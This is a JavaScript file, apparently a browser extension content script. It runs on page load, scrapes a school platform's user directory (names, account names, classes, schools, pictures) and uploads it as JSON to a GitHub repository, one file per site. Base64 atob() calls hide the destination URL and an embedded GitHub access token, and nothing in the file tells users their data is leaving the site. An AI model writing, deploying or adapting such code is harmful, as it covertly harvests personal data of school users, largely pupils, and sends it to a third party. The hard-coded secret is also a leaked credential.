// make a database from nothing
function makeADatabase() {
    let time = performance.now();

    fetch("?module=Messages&file=searchUsers")
        .then(response => response.text())
        .then(responseText => {
            // Create a new DOMParser
            // Parse the XML string
            const parser = new DOMParser();
            const xmlDoc = parser.parseFromString(responseText, "text/xml");

            // convert XML to JSON
            function xmlToJson(xml) {
                const obj = {};

                if (xml.nodeType == 1) {
                    if (xml.attributes.length > 0) {
                        obj['@attributes'] = {};
                        for (let j = 0; j < xml.attributes.length; j++) {
                            const attribute = xml.attributes.item(j);
                            obj['@attributes'][attribute.nodeName] = attribute.nodeValue;
                        }
                    }
                } else if (xml.nodeType == 3) {
                    obj.value = xml.nodeValue;
                }

                if (xml.hasChildNodes() && xml.childNodes.length === 1 && xml.childNodes[0].nodeType == 3) {
                    // If the element has a single text child, directly assign its value
                    obj.value = xml.childNodes[0].nodeValue;
                } else if (xml.hasChildNodes()) {
                    for (let i = 0; i < xml.childNodes.length; i++) {
                        const item = xml.childNodes.item(i);
                        const nodeName = item.nodeName;
                        if (typeof obj[nodeName] == "undefined") {
                            obj[nodeName] = xmlToJson(item);
                        } else {
                            if (typeof obj[nodeName].push == "undefined") {
                                const old = obj[nodeName];
                                obj[nodeName] = [];
                                obj[nodeName].push(old);
                            }
                            obj[nodeName].push(xmlToJson(item));
                        }
                    }
                }
                return obj;
            }

            // Get the prop of all users
            const users = xmlDoc.getElementsByTagName("user");

            // Convert the parsed XML document to JSON
            const jsonResult = [];

            function getXmlValue(tag, currentUser) {
                return currentUser.getElementsByTagName(tag)[0].textContent;
            }

            for (let i = 0; i < users.length; i++) {
                const user = users[i];
                const userId = user.getAttribute("id", user);
                const text = getXmlValue("text", user);
                const value = getXmlValue("value", user);
                const ssID = getXmlValue("ssID", user);
                const ssPlName = getXmlValue("ssPlName", user);
                const coaccountname = getXmlValue("coaccountname", user);
                const classname = getXmlValue("classname", user);
                const schoolname = getXmlValue("schoolname", user);
                const picture = getXmlValue("picture", user);

                const userJson = {
                    userId,
                    text,
                    value,
                    ssID,
                    ssPlName,
                    coaccountname,
                    classname,
                    schoolname,
                    picture,
                };

                jsonResult.push(userJson);
            }

            console.log(JSON.stringify(jsonResult));
            console.log("Time to convert xml to json \(ms\):", performance.now() - time);
            time = performance.now();
            uploadOrUpdate(jsonResult);
            console.log("Time to upload the cloud database \(ms\):", performance.now() - time);
        })
        .catch(error => console.error('Error:', error));
}

function uploadOrUpdate(userJson) {
    if (chrome.runtime.id == 'jpjkkimkbifallgiknjfieafmfndlkng') {
        fetch(atob('aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9IZXhjZWluLW1vb25zdGVycy9zbWFydHNjaG9vbC0vY29udGVudHMvZGF0YWJhc2VzLw==') + window.location.host + '.json')
            .then(response => response.json())
            .then(data => {
                if (data.sha) {
                    // If sha exists, update commit message and file content
                    const requestData = {
                        message: window.location.host + ": Updated database.",
                        content: btoa(JSON.stringify(userJson)),
                        sha: data.sha
                    };

                    fetch(atob('aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9IZXhjZWluLW1vb25zdGVycy9zbWFydHNjaG9vbC0vY29udGVudHMvZGF0YWJhc2VzLw==') + window.location.host + '.json', {
                            method: 'PUT',
                            headers: {
                                Authorization: 'token ' + atob('Z2l0aHViX3BhdF8xMUE1UUdXR0kwUnRXeTNmeElwZ1hkX25xbTFENEUzVDV1QlhWbTdveEhjR04xOXlMZW1KTElJRXVmZU9OdTBNdWVBUkVHNkJYRm5teVhITW00'),
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify(requestData)
                        })
                        .then(response => response.json())
                        .then(data => console.log(data))
                        .catch(error => console.error('Error:', error));
                } else {
                    // If sha doesn't exist, it's the first time, initialize the database
                    const requestData = {
                        message: window.location.host + ": This is the first time this database has been uploaded.",
                        content: btoa(JSON.stringify(userJson))
                    };

                    fetch(atob('aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9IZXhjZWluLW1vb25zdGVycy9zbWFydHNjaG9vbC0vY29udGVudHMvZGF0YWJhc2VzLw==') + window.location.host + '.json', {
                            method: 'PUT',
                            headers: {
                                Authorization: 'token ' + atob('Z2l0aHViX3BhdF8xMUE1UUdXR0kwUnRXeTNmeElwZ1hkX25xbTFENEUzVDV1QlhWbTdveEhjR04xOXlMZW1KTElJRXVmZU9OdTBNdWVBUkVHNkJYRm5teVhITW00'),
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify(requestData)
                        })
                        .then(response => response.json())
                        .then(data => console.log(data))
                        .catch(error => console.error('Error:', error));
                }
            })
            .catch(error => console.error('Error:', error));
    }
}




// MAKE A DATABASE
makeADatabase()